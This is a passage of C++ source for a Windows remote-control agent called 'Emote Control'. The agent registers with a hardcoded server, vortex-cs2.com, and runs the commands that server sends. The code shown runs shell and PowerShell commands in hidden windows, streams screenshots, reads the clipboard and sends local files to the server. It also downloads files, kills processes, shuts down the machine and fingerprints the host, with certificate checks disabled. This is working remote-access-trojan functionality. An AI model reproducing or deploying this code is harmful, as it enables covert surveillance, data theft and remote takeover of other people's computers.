/*
 * Emote Control — Native C++ Agent
 * Connects to server, registers, listens for commands, streams screen live.
 * Build: g++ -O2 -s -o EmoteAgent.exe agent.cpp -lwinhttp -lgdi32 -lole32 -lws2_32 -lshell32 -luser32 -lturbojpeg -I/c/msys64/mingw64/include -L/c/msys64/mingw64/lib
 */

#define _WIN32_WINNT 0x0601

#include <windows.h>
#include <shellapi.h>
#include <winhttp.h>
#include <objbase.h>
#include <shlobj.h>
#include "turbojpeg.h"

#include <string>
#include <vector>
#include <algorithm>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <io.h>
#include <direct.h>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "ws2_32.lib")

// ============================================================
// GLOBALS
// ============================================================

static std::string g_server_url = "https://vortex-cs2.com";
static std::string g_token;
static int g_session_id = 0;
static volatile LONG g_stream_requested = 0;
static volatile LONG g_streaming = 0;

static const int HEARTBEAT_INTERVAL = 15;
static const int POLL_INTERVAL = 1;

// Parsed URL components
struct ParsedURL {
    std::wstring host;
    INTERNET_PORT port;
    bool https;
};

static ParsedURL g_url;

// libjpeg-turbo compressor (reused across frames for speed)
static tjhandle g_tjCompressor = NULL;
// Reusable pixel buffer (avoids allocation every frame)
static std::vector<BYTE> g_pixelBuf;

// ============================================================
// UTILITY: String Conversion
// ============================================================

static std::wstring to_wide(const std::string& s) {
    if (s.empty()) return L"";
    int len = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), (int)s.size(), NULL, 0);
    std::wstring ws(len, 0);
    MultiByteToWideChar(CP_UTF8, 0, s.c_str(), (int)s.size(), &ws[0], len);
    return ws;
}

static std::string to_utf8(const std::wstring& ws) {
    if (ws.empty()) return "";
    int len = WideCharToMultiByte(CP_UTF8, 0, ws.c_str(), (int)ws.size(), NULL, 0, NULL, NULL);
    std::string s(len, 0);
    WideCharToMultiByte(CP_UTF8, 0, ws.c_str(), (int)ws.size(), &s[0], len, NULL, NULL);
    return s;
}

// ============================================================
// UTILITY: JSON Helpers
// ============================================================

static std::string json_escape(const std::string& s) {
    std::string out;
    out.reserve(s.size() + 32);
    for (unsigned char c : s) {
        switch (c) {
            case '"':  out += "\\\""; break;
            case '\\': out += "\\\\"; break;
            case '\n': out += "\\n"; break;
            case '\r': out += "\\r"; break;
            case '\t': out += "\\t"; break;
            default:
                if (c < 0x20) {
                    char buf[8];
                    snprintf(buf, sizeof(buf), "\\u%04x", c);
                    out += buf;
                } else {
                    out += (char)c;
                }
        }
    }
    return out;
}

// Extract a string value from simple JSON: {"key": "value"}
static std::string json_get(const std::string& json, const std::string& key) {
    std::string search = "\"" + key + "\"";
    size_t pos = json.find(search);
    if (pos == std::string::npos) return "";
    pos = json.find(':', pos + search.size());
    if (pos == std::string::npos) return "";
    pos++;
    while (pos < json.size() && (json[pos] == ' ' || json[pos] == '\t')) pos++;
    if (pos >= json.size()) return "";

    if (json[pos] == '"') {
        pos++;
        std::string val;
        while (pos < json.size() && json[pos] != '"') {
            if (json[pos] == '\\' && pos + 1 < json.size()) {
                pos++;
                switch (json[pos]) {
                    case '"': val += '"'; break;
                    case '\\': val += '\\'; break;
                    case 'n': val += '\n'; break;
                    case 'r': val += '\r'; break;
                    case 't': val += '\t'; break;
                    default: val += json[pos];
                }
            } else {
                val += json[pos];
            }
            pos++;
        }
        return val;
    }
    // number, bool, null
    size_t end = json.find_first_of(",}] \t\r\n", pos);
    if (end == std::string::npos) end = json.size();
    return json.substr(pos, end - pos);
}

// Simple command object
struct Command {
    std::string id;
    std::string command;
    std::string args;
};

// Parse commands array from JSON response
static std::vector<Command> parse_commands(const std::string& json) {
    std::vector<Command> cmds;
    size_t pos = json.find("\"commands\"");
    if (pos == std::string::npos) return cmds;
    pos = json.find('[', pos);
    if (pos == std::string::npos) return cmds;

    while (true) {
        size_t obj_start = json.find('{', pos);
        if (obj_start == std::string::npos) break;
        // Find matching closing brace (simple — no nested objects in our data)
        size_t obj_end = json.find('}', obj_start);
        if (obj_end == std::string::npos) break;

        std::string obj = json.substr(obj_start, obj_end - obj_start + 1);
        Command cmd;
        cmd.id = json_get(obj, "id");
        cmd.command = json_get(obj, "command");
        cmd.args = json_get(obj, "args");
        if (cmd.args == "null") cmd.args = "";
        cmds.push_back(cmd);

        pos = obj_end + 1;
        // Check if we've reached end of array
        size_t next = json.find_first_not_of(" ,\r\n\t", pos);
        if (next == std::string::npos || json[next] == ']') break;
    }
    return cmds;
}

// ============================================================
// URL PARSER
// ============================================================

static ParsedURL parse_url(const std::string& url) {
    ParsedURL p;
    std::string u = url;
    p.https = true;
    p.port = INTERNET_DEFAULT_HTTPS_PORT;

    if (u.substr(0, 8) == "https://") {
        u = u.substr(8);
        p.https = true;
        p.port = INTERNET_DEFAULT_HTTPS_PORT;
    } else if (u.substr(0, 7) == "http://") {
        u = u.substr(7);
        p.https = false;
        p.port = INTERNET_DEFAULT_HTTP_PORT;
    }

    // Remove trailing slash
    while (!u.empty() && u.back() == '/') u.pop_back();

    size_t colon = u.find(':');
    size_t slash = u.find('/');
    if (colon != std::string::npos && (slash == std::string::npos || colon < slash)) {
        p.host = to_wide(u.substr(0, colon));
        std::string port_str = u.substr(colon + 1, slash == std::string::npos ? std::string::npos : slash - colon - 1);
        p.port = (INTERNET_PORT)atoi(port_str.c_str());
    } else {
        p.host = to_wide(slash == std::string::npos ? u : u.substr(0, slash));
    }
    return p;
}

// ============================================================
// HTTP CLIENT (WinHTTP)
// ============================================================

struct HttpResponse {
    int status;
    std::string body;
};

static HttpResponse http_request(const std::wstring& method, const std::wstring& path,
                                 const std::string& body = "",
                                 const std::string& content_type = "application/json",
                                 const std::string& token = "") {
    HttpResponse resp{0, ""};

    HINTERNET hSession = WinHttpOpen(L"EmoteAgent/2.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return resp;

    HINTERNET hConnect = WinHttpConnect(hSession, g_url.host.c_str(), g_url.port, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return resp; }

    DWORD flags = g_url.https ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, method.c_str(), path.c_str(),
        NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return resp;
    }

    // Ignore cert errors for dev
    if (g_url.https) {
        DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                        SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                        SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
    }

    // Headers
    std::wstring hdrs = L"Content-Type: " + to_wide(content_type) + L"\r\n";
    if (!token.empty()) {
        hdrs += L"Authorization: Bearer " + to_wide(token) + L"\r\n";
    }
    WinHttpAddRequestHeaders(hRequest, hdrs.c_str(), (DWORD)-1, WINHTTP_ADDREQ_FLAG_ADD);

    BOOL ok = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
        body.empty() ? WINHTTP_NO_REQUEST_DATA : (LPVOID)body.c_str(),
        (DWORD)body.size(), (DWORD)body.size(), 0);

    if (ok) ok = WinHttpReceiveResponse(hRequest, NULL);

    if (ok) {
        DWORD statusCode = 0, dwSize = sizeof(statusCode);
        WinHttpQueryHeaders(hRequest,
            WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
            WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &dwSize, WINHTTP_NO_HEADER_INDEX);
        resp.status = (int)statusCode;

        // Read body
        DWORD bytesAvailable = 0;
        while (WinHttpQueryDataAvailable(hRequest, &bytesAvailable) && bytesAvailable > 0) {
            std::vector<char> buf(bytesAvailable);
            DWORD bytesRead = 0;
            WinHttpReadData(hRequest, buf.data(), bytesAvailable, &bytesRead);
            resp.body.append(buf.data(), bytesRead);
        }
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return resp;
}

// Convenience wrappers
static HttpResponse http_post(const std::string& path, const std::string& json_body) {
    return http_request(L"POST", to_wide(path), json_body, "application/json", g_token);
}

static HttpResponse http_get(const std::string& path) {
    return http_request(L"GET", to_wide(path), "", "application/json", g_token);
}

// POST binary data (for screen frames)
static HttpResponse http_post_binary(const std::string& path, const std::vector<BYTE>& data) {
    HttpResponse resp{0, ""};

    HINTERNET hSession = WinHttpOpen(L"EmoteAgent/2.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return resp;

    HINTERNET hConnect = WinHttpConnect(hSession, g_url.host.c_str(), g_url.port, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return resp; }

    DWORD flags = g_url.https ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", to_wide(path).c_str(),
        NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return resp;
    }

    if (g_url.https) {
        DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                        SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                        SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
    }

    std::wstring hdrs = L"Content-Type: image/jpeg\r\nAuthorization: Bearer " + to_wide(g_token) + L"\r\n";
    WinHttpAddRequestHeaders(hRequest, hdrs.c_str(), (DWORD)-1, WINHTTP_ADDREQ_FLAG_ADD);

    BOOL ok = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
        (LPVOID)data.data(), (DWORD)data.size(), (DWORD)data.size(), 0);
    if (ok) ok = WinHttpReceiveResponse(hRequest, NULL);

    if (ok) {
        DWORD statusCode = 0, dwSize = sizeof(statusCode);
        WinHttpQueryHeaders(hRequest,
            WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
            WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &dwSize, WINHTTP_NO_HEADER_INDEX);
        resp.status = (int)statusCode;

        DWORD bytesAvailable = 0;
        while (WinHttpQueryDataAvailable(hRequest, &bytesAvailable) && bytesAvailable > 0) {
            std::vector<char> buf(bytesAvailable);
            DWORD bytesRead = 0;
            WinHttpReadData(hRequest, buf.data(), bytesAvailable, &bytesRead);
            resp.body.append(buf.data(), bytesRead);
        }
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return resp;
}

// ============================================================
// SYSTEM INFO HELPERS
// ============================================================

static std::string get_machine_name() {
    char name[256];
    DWORD size = sizeof(name);
    GetComputerNameA(name, &size);

    OSVERSIONINFOEXA osvi;
    ZeroMemory(&osvi, sizeof(osvi));
    osvi.dwOSVersionInfoSize = sizeof(osvi);

    std::string os_ver = "Windows";
    // Use RtlGetVersion for accurate version
    typedef LONG(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (ntdll) {
        auto fn = (RtlGetVersionPtr)GetProcAddress(ntdll, "RtlGetVersion");
        if (fn) {
            RTL_OSVERSIONINFOW rovi;
            rovi.dwOSVersionInfoSize = sizeof(rovi);
            if (fn(&rovi) == 0) {
                os_ver = "Windows " + std::to_string(rovi.dwMajorVersion) + "." + std::to_string(rovi.dwMinorVersion);
            }
        }
    }

    return std::string(name) + " (" + os_ver + ")";
}

static std::string get_hwid() {
    // Try WMI via PowerShell
    char tmpfile[MAX_PATH];
    GetTempPathA(MAX_PATH, tmpfile);
    strcat(tmpfile, "ec_hwid.txt");

    std::string cmd = "powershell -NoProfile -Command \"(Get-CimInstance Win32_ComputerSystemProduct).UUID\" > \"" + std::string(tmpfile) + "\" 2>nul";
    system(cmd.c_str());

    FILE* f = fopen(tmpfile, "r");
    std::string uuid;
    if (f) {
        char buf[256];
        if (fgets(buf, sizeof(buf), f)) {
            uuid = buf;
            // Trim
            while (!uuid.empty() && (uuid.back() == '\n' || uuid.back() == '\r' || uuid.back() == ' '))
                uuid.pop_back();
        }
        fclose(f);
        DeleteFileA(tmpfile);
    }

    if (uuid.empty() || uuid == "FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF") {
        // Fallback: MAC address based
        char mac[64];
        snprintf(mac, sizeof(mac), "%lu", (unsigned long)GetTickCount64());
        uuid = mac;
    }

    // Simple hash (SHA-like via Windows)
    // Use a basic hash for simplicity
    unsigned int hash = 5381;
    for (char c : uuid) hash = ((hash << 5) + hash) + c;
    char result[33];
    snprintf(result, sizeof(result), "%08x%08x%08x%08x",
        hash, hash ^ 0xDEADBEEF, hash ^ 0xCAFEBABE, hash ^ 0x12345678);
    return std::string(result, 32);
}

static std::string get_username() {
    char buf[256];
    DWORD size = sizeof(buf);
    if (GetUserNameA(buf, &size)) return buf;
    return "unknown";
}

// ============================================================
// RUN COMMAND (shell)
// ============================================================

static std::string run_command(const std::string& cmd, int timeout_ms = 30000) {
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    HANDLE hReadPipe, hWritePipe;
    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) return "Error: CreatePipe failed";

    SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.hStdOutput = hWritePipe;
    si.hStdError = hWritePipe;
    si.dwFlags |= STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    std::string full_cmd = "cmd /c " + cmd;

    if (!CreateProcessA(NULL, (LPSTR)full_cmd.c_str(), NULL, NULL, TRUE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(hReadPipe);
        CloseHandle(hWritePipe);
        return "Error: CreateProcess failed";
    }

    CloseHandle(hWritePipe);

    std::string output;
    char buffer[4096];
    DWORD bytesRead;

    DWORD waitResult = WaitForSingleObject(pi.hProcess, (DWORD)timeout_ms);
    if (waitResult == WAIT_TIMEOUT) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        CloseHandle(hReadPipe);
        return "Timed out (30s limit)";
    }

    while (ReadFile(hReadPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
        buffer[bytesRead] = 0;
        output += buffer;
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hReadPipe);

    if (output.empty()) output = "(no output)";
    if (output.size() > 5000) output = output.substr(0, 5000);
    return output;
}

// Run PowerShell command
static std::string run_ps(const std::string& script) {
    return run_command("powershell -NoProfile -Command \"" + script + "\"");
}

// ============================================================
// SCREEN CAPTURE (GDI + GDI+ JPEG)
// ============================================================

// ============================================================
// SCREEN CAPTURE — GDI capture + libjpeg-turbo JPEG (SIMD-accelerated)
// ============================================================

static std::vector<BYTE> capture_screen_jpeg(int quality = 50) {
    std::vector<BYTE> result;

    int screenW = GetSystemMetrics(SM_CXSCREEN);
    int screenH = GetSystemMetrics(SM_CYSCREEN);

    // Scale to 1280 wide
    int capW = screenW, capH = screenH;
    if (capW > 1280) {
        capH = (int)((double)capH * 1280.0 / capW);
        capW = 1280;
    }

    HDC hScreen = GetDC(NULL);
    if (!hScreen) return result;
    HDC hMemDC = CreateCompatibleDC(hScreen);
    if (!hMemDC) { ReleaseDC(NULL, hScreen); return result; }
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, capW, capH);
    if (!hBitmap) { DeleteDC(hMemDC); ReleaseDC(NULL, hScreen); return result; }
    HGDIOBJ hOld = SelectObject(hMemDC, hBitmap);

    SetStretchBltMode(hMemDC, COLORONCOLOR);
    StretchBlt(hMemDC, 0, 0, capW, capH, hScreen, 0, 0, screenW, screenH, SRCCOPY);

    SelectObject(hMemDC, hOld);

    // Extract raw BGRA pixels via GetDIBits (no GDI+ needed)
    BITMAPINFOHEADER bi = {};
    bi.biSize = sizeof(bi);
    bi.biWidth = capW;
    bi.biHeight = -capH; // negative = top-down row order
    bi.biPlanes = 1;
    bi.biBitCount = 32;
    bi.biCompression = BI_RGB;

    size_t pixelSize = (size_t)capW * capH * 4;
    if (g_pixelBuf.size() < pixelSize) g_pixelBuf.resize(pixelSize);

    GetDIBits(hMemDC, hBitmap, 0, capH, g_pixelBuf.data(), (BITMAPINFO*)&bi, DIB_RGB_COLORS);

    DeleteObject(hBitmap);
    DeleteDC(hMemDC);
    ReleaseDC(NULL, hScreen);

    // JPEG encode with libjpeg-turbo (SIMD-accelerated, ~3-8ms vs GDI+ 30-50ms)
    if (!g_tjCompressor) g_tjCompressor = tjInitCompress();
    if (!g_tjCompressor) return result;

    unsigned char* jpegBuf = NULL;
    unsigned long jpegSize = 0;

    int rc = tjCompress2(
        g_tjCompressor,
        g_pixelBuf.data(),
        capW, 0, capH,
        TJPF_BGRA,         // matches GDI GetDIBits output
        &jpegBuf,
        &jpegSize,
        TJSAMP_420,         // 4:2:0 chroma = smallest file
        quality,
        TJFLAG_FASTDCT      // fast DCT for speed
    );

    if (rc == 0 && jpegBuf && jpegSize > 0) {
        result.assign(jpegBuf, jpegBuf + jpegSize);
    }

    if (jpegBuf) tjFree(jpegBuf);
    return result;
}

// ============================================================
// BASE64 ENCODE (for screenshot command)
// ============================================================

static const char b64_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static std::string base64_encode(const std::vector<BYTE>& data) {
    std::string out;
    int val = 0, valb = -6;
    for (BYTE c : data) {
        val = (val << 8) + c;
        valb += 8;
        while (valb >= 0) {
            out += b64_table[(val >> valb) & 0x3F];
            valb -= 6;
        }
    }
    if (valb > -6) out += b64_table[((val << 8) >> (valb + 8)) & 0x3F];
    while (out.size() % 4) out += '=';
    return out;
}

// ============================================================
// COMMAND HANDLERS
// ============================================================

struct CmdResult {
    std::string text;
    std::string status; // "done" or "failed"
};

static CmdResult handle_screenshot(const std::string& args) {
    auto jpeg = capture_screen_jpeg(80);
    if (jpeg.empty()) return {"Screenshot error: capture failed", "failed"};
    std::string b64 = base64_encode(jpeg);
    return {"[Screenshot - " + std::to_string(b64.size()) + " bytes]\ndata:image/png;base64," + b64.substr(0, 200) + "...", "done"};
}

static CmdResult handle_sysinfo(const std::string& args) {
    std::string info;
    char name[256]; DWORD sz = sizeof(name);
    GetComputerNameA(name, &sz);
    info += "Hostname:  " + std::string(name) + "\n";
    info += "Username:  " + get_username() + "\n";

    // Use PowerShell for detailed info
    std::string ps = run_ps(
        "$m=Get-CimInstance Win32_OperatingSystem;"
        "$t=[math]::Round($m.TotalVisibleMemorySize/1MB,1);"
        "$f=[math]::Round($m.FreePhysicalMemory/1MB,1);"
        "$cpu=Get-CimInstance Win32_Processor;"
        "$d=Get-CimInstance Win32_LogicalDisk -Filter \\\"DeviceID='C:'\\\";"
        "$dt=[math]::Round($d.Size/1GB,1);"
        "$df=[math]::Round($d.FreeSpace/1GB,1);"
        "$up=(Get-Date)-(Get-CimInstance Win32_OperatingSystem).LastBootUpTime;"
        "\\\"OS:        $($m.Caption) $($m.Version)\\\";"
        "\\\"RAM:       $t GB total, $([math]::Round($t-$f,1)) GB used, $f GB free\\\";"
        "\\\"CPU:       $($cpu.Name.Trim()) ($($cpu.NumberOfLogicalProcessors) cores)\\\";"
        "\\\"Disk C:    $dt GB total, $([math]::Round($dt-$df,1)) GB used, $df GB free\\\";"
        "\\\"Uptime:    $($up.Days)d $($up.Hours)h $($up.Minutes)m\\\""
    );
    info += ps;
    return {info, "done"};
}

static CmdResult handle_cmd(const std::string& args) {
    if (args.empty()) return {"No command provided", "failed"};
    return {run_command(args), "done"};
}

static CmdResult handle_list_files(const std::string& args) {
    std::string path = args;
    if (path.empty()) {
        char home[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, 0, home)))
            path = home;
        else
            path = "C:\\";
    }

    WIN32_FIND_DATAA fd;
    std::string search = path + "\\*";
    HANDLE hFind = FindFirstFileA(search.c_str(), &fd);
    if (hFind == INVALID_HANDLE_VALUE) return {"Cannot list: " + path, "failed"};

    std::string out = path + ":\n";
    int count = 0;
    do {
        if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0) continue;
        count++;
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            out += "  [DIR]  " + std::string(fd.cFileName) + "\n";
        } else {
            ULONGLONG size = ((ULONGLONG)fd.nFileSizeHigh << 32) | fd.nFileSizeLow;
            std::string sz;
            if (size < 1024) sz = std::to_string(size) + " B";
            else if (size < 1024*1024) sz = std::to_string(size/1024) + " KB";
            else sz = std::to_string(size/(1024*1024)) + " MB";
            out += "  [FILE] " + std::string(fd.cFileName) + " (" + sz + ")\n";
        }
    } while (FindNextFileA(hFind, &fd) && count < 200);
    FindClose(hFind);

    out = path + " (" + std::to_string(count) + " items):\n" + out.substr(out.find('\n') + 1);
    if (out.size() > 5000) out = out.substr(0, 5000);
    return {out, "done"};
}

static CmdResult handle_open(const std::string& args) {
    if (args.empty()) return {"No path provided", "failed"};
    ShellExecuteA(NULL, "open", args.c_str(), NULL, NULL, SW_SHOWNORMAL);
    return {"Opened: " + args, "done"};
}

static CmdResult handle_notify(const std::string& args) {
    std::string msg = args.empty() ? "Emote Control" : args;
    std::string ps = "[Windows.UI.Notifications.ToastNotificationManager, Windows.UI.Notifications, ContentType = WindowsRuntime] > $null;"
        "$t = [Windows.UI.Notifications.ToastNotificationManager]::GetTemplateContent([Windows.UI.Notifications.ToastTemplateType]::ToastText01);"
        "$t.GetElementsByTagName('text')[0].AppendChild($t.CreateTextNode('" + msg + "')) > $null;"
        "[Windows.UI.Notifications.ToastNotification]::new($t) | ForEach-Object { [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier('Emote Control').Show($_) }";
    run_ps(ps);
    return {"Notification: " + msg, "done"};
}

static CmdResult handle_download(const std::string& args) {
    if (args.empty()) return {"Usage: download URL [save_path]", "failed"};
    // Use PowerShell Invoke-WebRequest for downloading
    size_t sp = args.find(' ');
    std::string url = (sp != std::string::npos) ? args.substr(0, sp) : args;
    std::string save;
    if (sp != std::string::npos) {
        save = args.substr(sp + 1);
    } else {
        char home[MAX_PATH];
        SHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, 0, home);
        std::string fname = url.substr(url.rfind('/') + 1);
        if (fname.empty()) fname = "download";
        save = std::string(home) + "\\Downloads\\" + fname;
    }

    std::string ps = "Invoke-WebRequest -Uri '" + url + "' -OutFile '" + save + "' -UseBasicParsing";
    std::string result = run_ps(ps);
    return {"Downloaded: " + url + " -> " + save, "done"};
}

static CmdResult handle_upload(const std::string& args) {
    if (args.empty()) return {"Usage: upload filepath", "failed"};
    HANDLE hFile = CreateFileA(args.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return {"File not found: " + args, "failed"};

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize > 5 * 1024 * 1024) {
        CloseHandle(hFile);
        return {"File too large (max 5MB)", "failed"};
    }

    std::vector<BYTE> data(fileSize);
    DWORD bytesRead;
    ReadFile(hFile, data.data(), fileSize, &bytesRead, NULL);
    CloseHandle(hFile);

    std::string b64 = base64_encode(data);
    std::string fname = args.substr(args.find_last_of("\\/") + 1);
    return {"[File: " + fname + " (" + std::to_string(fileSize) + " bytes)]\ndata:application/octet-stream;base64," + b64, "done"};
}

static CmdResult handle_clipboard(const std::string& args) {
    std::string result = run_ps("Get-Clipboard");
    if (result.empty() || result == "(no output)") return {"Clipboard is empty or contains non-text data", "done"};
    return {"Clipboard contents:\n" + result.substr(0, 5000), "done"};
}

static CmdResult handle_processes(const std::string& args) {
    return {run_ps(
        "$p=Get-Process | Sort-Object WorkingSet64 -Descending | Select-Object -First 30;"
        "$lines=@('Top 30 processes by memory:','');"
        "$lines+='{0,-8} {1,-35} {2,10} {3,10}' -f 'PID','Name','RAM (MB)','CPU (s)';"
        "$lines+='-' * 65;"
        "foreach($x in $p){$ram=[math]::Round($x.WorkingSet64/1MB,1);$cpu=[math]::Round($x.CPU,1);$lines+='{0,-8} {1,-35} {2,10} {3,10}' -f $x.Id,$x.ProcessName,$ram,$cpu};"
        "$lines -join \\\"`n\\\""
    ), "done"};
}

static CmdResult handle_kill(const std::string& args) {
    if (args.empty()) return {"Usage: kill process_name_or_pid", "failed"};
    bool isNum = true;
    for (char c : args) if (!isdigit(c)) { isNum = false; break; }
    if (isNum) {
        return {run_command("taskkill /F /PID " + args), "done"};
    } else {
        std::string name = args;
        if (name.find(".exe") == std::string::npos) name += ".exe";
        return {run_command("taskkill /F /IM " + name), "done"};
    }
}

static CmdResult handle_shutdown(const std::string& args) {
    run_command("shutdown /s /t 5 /c \"Emote Control: Remote shutdown\"");
    return {"Shutting down PC...", "done"};
}

static CmdResult handle_restart(const std::string& args) {
    run_command("shutdown /r /t 5 /c \"Emote Control: Remote restart\"");
    return {"Restarting PC...", "done"};
}

static CmdResult handle_lock(const std::string& args) {
    LockWorkStation();
    return {"PC locked", "done"};
}

static DWORD WINAPI msgbox_thread(LPVOID param) {
    char* msg = (char*)param;
    MessageBoxA(NULL, msg, "Emote Control", MB_OK | MB_ICONINFORMATION);
    free(msg);
    return 0;
}

static CmdResult handle_msgbox(const std::string& args) {
    std::string msg = args.empty() ? "Hello from Emote Control" : args;
    char* dup = _strdup(msg.c_str());
    CreateThread(NULL, 0, msgbox_thread, dup, 0, NULL);
    return {"Message box shown: " + msg, "done"};
}

static CmdResult handle_wifi(const std::string& args) {
    return {run_ps(
        "$info=@();"
        "$prof=netsh wlan show interfaces 2>$null;"
        "if($prof){$info+='WiFi Status:';$info+=$prof}else{$info+='No WiFi adapter found'};"
        "$info+='';"
        "$info+='IP Configuration:';"
        "$ip=Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -ne '127.0.0.1'} | Select-Object InterfaceAlias,IPAddress;"
        "foreach($i in $ip){$info+=\\\"  $($i.InterfaceAlias): $($i.IPAddress)\\\"};"
        "$gw=Get-NetRoute -DestinationPrefix '0.0.0.0/0' -ErrorAction SilentlyContinue | Select-Object -First 1;"
        "if($gw){$info+=\\\"  Gateway: $($gw.NextHop)\\\"};"
        "try{$pub=Invoke-RestMethod -Uri 'https://api.ipify.org' -TimeoutSec 5;$info+=\\\"  Public IP: $pub\\\"}catch{};"
        "$info -join \\\"`n\\\""
    ), "done"};
}

static CmdResult handle_battery(const std::string& args) {
    return {run_ps(
        "$b=Get-CimInstance Win32_Battery -ErrorAction Stop;"
        "if($b){"
        "  $s=switch($b.BatteryStatus){1{'Discharging'}2{'AC Power'}3{'Fully Charged'}6{'Charging'}default{'Unknown'}};"
        "  $r=if($b.EstimatedRunTime -and $b.EstimatedRunTime -lt 71582788){\\\"$([math]::Round($b.EstimatedRunTime/60,1)) hours remaining\\\"}else{'Calculating...'};"
        "  \\\"Battery: $($b.EstimatedChargeRemaining)%`nStatus: $s`nEstimated runtime: $r\\\""
        "}else{'No battery detected (desktop PC?)'}"
    ), "done"};
}

static CmdResult handle_drives(const std::string& args) {
    return {run_ps(
        "$disks=Get-CimInstance Win32_LogicalDisk;"
        "$lines=@('Drive    Type         Total      Used       Free       Usage');"
        "$lines+='-' * 65;"
        "foreach($d in $disks){"
        "  $type=switch($d.DriveType){2{'Removable'}3{'Local Disk'}4{'Network'}5{'CD/DVD'}default{'Unknown'}};"
        "  if($d.Size){$t=[math]::Round($d.Size/1GB,1);$f=[math]::Round($d.FreeSpace/1GB,1);$u=[math]::Round($t-$f,1);$p=[math]::Round(($u/$t)*100,0);$lines+='{0,-8} {1,-12} {2,8} GB  {3,8} GB  {4,8} GB  {5,4}%' -f $d.DeviceID,$type,$t,$u,$f,$p}"
        "  else{$lines+='{0,-8} {1,-12} (not ready)' -f $d.DeviceID,$type}"
        "};"
        "$lines -join \\\"`n\\\""
    ), "done"};
}

static CmdResult handle_installed(const std::string& args) {
    return {run_ps(
        "$apps=@();"
        "$apps+=Get-ItemProperty 'HKLM:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\\\\*' -EA SilentlyContinue;"
        "$apps+=Get-ItemProperty 'HKLM:\\\\Software\\\\WOW6432Node\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\\\\*' -EA SilentlyContinue;"
        "$apps+=Get-ItemProperty 'HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\\\\*' -EA SilentlyContinue;"
        "$f=$apps | Where-Object {$_.DisplayName} | Sort-Object DisplayName | Select-Object -Unique DisplayName,DisplayVersion,Publisher;"
        "$lines=@(\\\"Installed Programs ($($f.Count) total):\\\",'');"
